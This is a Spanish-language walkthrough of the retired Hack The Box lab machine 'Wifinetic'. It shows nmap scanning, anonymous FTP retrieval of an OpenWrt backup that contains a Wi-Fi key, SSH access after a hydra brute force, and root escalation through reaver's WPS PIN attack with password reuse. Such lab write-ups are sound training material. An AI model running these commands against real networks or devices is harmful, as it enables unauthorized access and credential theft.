# Wifinetic HTB

### Máquina Easy - Linux - Retirada

## Fase de Escaneo

Primero realizamos un escaneo para identificar los puertos abiertos
```
sudo nmap 10.10.11.247 -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts
```

Encontramos los siguientes puertos abiertos:
```
 Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 53/open/tcp//domain
```

Ahora procedemos a realizar la segunda parte del escaneo, pero más exhaustivo.
```
nmap -p21,22,53 10.10.11.247 -Pn -oN Targeted
```

Nuestro resultado es:
```
# Nmap 7.94 scan initiated Tue Oct 31 00:55:24 2023 as: nmap -sCV -p21,22,53 -oN Targeted 10.10.11.247
Nmap scan report for 10.10.11.247
Host is up (0.22s latency).

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 31 00:55:39 2023 -- 1 IP address (1 host up) scanned in 14.91 seconds
```

Podemos observar que el puerto 21 FTP, podemos acceder como Anonymous y ver que carpeta se está compartiendo por el mismo.


---
## Fase de enumeración

```
ftp 10.10.11.247
```

Procedemos a entrar como Anonymous y luego listamos los archivos disponibles.

```
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||42179|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
ftp> 
```

Esos son los archivos disponibles, ahora lo pasaremos a nuestra máquina local con `mget*`

Procedemos a descomprimir el archivo .tar

```
tar -xf backup-OpenWrt-2023-07-26.tar
```

Revisando todo los recursos disponibles, recolectamos los posibles usuarios. Además en la carpeta "config", encontré un archivo llamado wireless. Cuando le realicé un `cat`, leyendo me encontré una parte donde se encontraba una contraseña.  

```
option key '******************'
```

Realicé un ataque de fuerza bruta con hydra con la recolección de usuarios que había hecho previamente y tuve éxito.

```
ssh netadmin@10.10.11.247 
```

Una vez adentro obtenemos la primera flag

```
651*************************
```


---
## Escalada de Privilegios

Traté de buscar binarios con permisos SUID, pero no encontré ninguno que pudiera explotar. así que busqué las capabilities.

```
getcap -r / 2>/dev/null
```

```
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

Previamente es mi investigación al comienzo, investigué acerca de `Reaver` es una herramienta que permite realizar ataques de fuerza bruta contra puntos de acceso que tienen activado el WPS (Wifi Protected Setup), se trata de un mecanismo que es, al día de escribir este articulo, uno de los más efectivos que hay contra WPA-PSK.

Procedemos a ejecutar el programa:

```
reaver -b 02:00:00:00:00:00 -i mon0 -v
```

Este seria el resultado:

```
netadmin@wifinetic:~$ reaver -b 02:00:00:00:00:00 -i mon0 -v

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[!] Found packet with bad FCS, skipping...
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'PASSWORD'
[+] AP SSID: 'OpenWrt'
```

Obtuvimos una contraseña, ahora accederemos al usuario root para probar si las credenciales son válidas.

```
netadmin@wifinetic:~$ su root
Password: 
root@wifinetic:/home/netadmin# id
uid=0(root) gid=0(root) groups=0(root)
root@wifinetic:/home/netadmin# 
```

Ya tenemos acceso al usuario root , ahora solo tocaría buscar la última flag
```
root@wifinetic:/home/netadmin# cat /root/root.txt 
94********************************
root@wifinetic:/home/netadmin# 
```

¡Máquina totalmete PWNED! :D
